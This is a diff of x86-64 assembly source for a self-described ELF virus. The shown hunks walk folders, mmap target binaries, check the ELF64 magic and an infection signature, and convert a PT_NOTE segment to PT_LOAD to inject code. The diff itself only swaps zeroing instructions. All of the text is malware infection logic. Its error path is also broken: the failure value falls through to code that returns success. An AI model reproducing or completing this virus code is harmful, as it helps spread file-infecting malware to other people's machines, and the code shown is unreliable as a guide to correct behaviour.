@@ -132,7 +132,7 @@ _jmp_instr:
 							; or to next instruction if original virus
 
 	mov rax, SYS_EXIT				; exit(
-	mov rdi, 0					; 0
+	xor rdi, rdi					; 0
 	syscall						; );
 
 ; void treate_folder(char const *_folder);
@@ -298,7 +298,7 @@ treat_file:
 	; TODO Check man 2 and 3P of mmap. Not sure if I can do this
 	; https://stackoverflow.com/questions/15684771/how-to-portably-extend-a-file-accessed-using-mmap
 	mov rax, SYS_MMAP				; _ret = mmap(
-	mov rdi, 0					; 	0,
+	xor rdi, rdi					; 	0,
 	mov rsi, [filesize]				; 	filesize + (_end - _start),
 	add rsi, _end - _start				;	...
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
@@ -468,7 +468,7 @@ get_next_available_vaddr:
 	mov QWORD [furthest_segment_end], 0		; furthest_segement_end = 0;
 
 	; loop through program headers
-	mov rsi, 0					; i = 0;
+	xor rsi, rsi					; i = 0;
 	.begin_phdr_loop:				; do {
 		mov rax, [file_map]			; _cur_phdr = file_map
 		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
@@ -513,7 +513,7 @@ get_next_available_vaddr:
 ; int is_elf_64(char const *file_map);
 ; rax is_elf_64(rdi file_map);
 is_elf_64:
-	mov rsi, 0					; counter = 0;
+	xor rsi, rsi					; counter = 0;
 	.begin_magic_loop:				; while (true) {
 		mov al, [rdi + rsi]			; 	_c = file_map[counter];
 		lea r8, [rel elf_64_magic]
@@ -563,7 +563,7 @@ find_note_segment:
 	mov [e_phnum], rax				; ...
 
 	; loop through program headers
-	mov rsi, 0					; i = 0;
+	xor rsi, rsi					; i = 0;
 	.begin_phdr_loop:				; while (true) {
 		mov rax, [file_map]			; cur_phdr = file_map
 		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
@@ -630,7 +630,7 @@ has_signature:
 	mov [e_phnum], rax				; ...
 
 	; loop through program headers
-	mov rsi, 0					; i = 0;
+	xor rsi, rsi					; i = 0;
 	.begin_phdr_loop:				; while (true) {
 		mov rax, [file_map]			; cur_phdr = file_map
 		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
@@ -766,7 +766,7 @@ convert_pt_note_to_load:
 	jmp .success
 
 .err:
-	mov rax, 0					; _ret = false;
+	xor rax, rax					; _ret = false;
 
 .success:
 	mov rax, 1					; _ret = true;
